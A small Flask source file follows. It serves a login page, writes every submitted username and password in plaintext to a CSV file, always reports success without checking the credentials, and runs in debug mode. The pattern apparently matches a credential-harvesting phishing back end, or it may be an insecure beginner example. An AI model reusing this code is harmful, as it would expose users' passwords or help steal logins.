from flask import Flask, redirect, url_for, request, render_template, jsonify
import csv

app = Flask(__name__)
@app.route("/")
def index():
    return render_template("/login.html")

@app.route("/login",methods=["POST"])
def login():
    user_name = request.json.get("username")
    pass_word = request.json.get("password")

    with open("data.csv","a+") as f:
        csv_writer = csv.writer(f)
        csv_writer.writerow([user_name,pass_word])
        
    return jsonify({"status":"success"}),201
if __name__ == "__main__":
    app.run(debug = True)
